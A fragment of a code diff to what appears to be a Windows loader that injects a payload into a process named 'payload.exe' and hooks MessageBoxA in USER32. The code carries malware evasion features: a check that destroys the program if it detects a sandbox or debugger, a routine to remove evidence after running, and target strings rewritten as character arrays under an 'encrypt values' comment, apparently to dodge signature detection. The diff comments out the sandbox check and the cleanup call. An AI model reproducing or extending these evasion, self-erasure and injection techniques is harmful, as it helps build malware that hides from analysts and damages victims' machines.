@@ -11,8 +11,9 @@
 //#define TARGET_FUNC	"MessageBoxA"
 //#define TARGET_DLL	"USER32"
 
-char const*	TARGET_FUNC = "MessageBoxA";
-const char* TARGET_DLL  = "USER32";
+// encrypt values
+char TARGET_FUNC[] = { 'M', 'e', 's', 's', 'a', 'g', 'e', 'B', 'o', 'x', 'A', '\0'};
+char TARGET_DLL[] = { 'U', 's', 'e', 'r', '3', '2', '\0'};
 
 
 // Get rid of weird crt call because of float
@@ -43,7 +44,7 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
 
 	do
 	{
-		hide.IsBeingWatched(resolver);				  // Nuke self if in sandbox or debugger
+		//hide.IsBeingWatched(resolver);				  // Nuke self if in sandbox or debugger
 		process = tools.GetPID("payload.exe");	  // Check if target process is running
 
 		if (process != 0)
@@ -57,7 +58,7 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
 
 	Payload(process, api, TARGET_DLL, (char*)TARGET_FUNC);// Run the payload
 	
-	hide.Nuke(resolver);								  // Remove evidence
+	//hide.Nuke(resolver);								  // Remove evidence
 	return 0;
 } 
 
